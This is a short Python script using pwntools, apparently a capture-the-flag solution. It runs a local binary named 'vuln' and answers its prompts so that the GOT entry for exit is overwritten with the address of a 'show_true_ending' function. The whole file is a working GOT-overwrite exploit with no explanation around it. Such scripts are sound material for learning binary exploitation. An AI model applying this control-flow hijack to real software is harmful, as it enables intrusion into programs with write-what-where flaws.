from pwn import *

ex = "./vuln"
elf = ELF(ex)
p = process(ex)

p.sendlineafter("something?\n", str(elf.got['exit']))
p.sendlineafter("write?", str(elf.symbols['show_true_ending']))

out = p.recvall()

print(out)
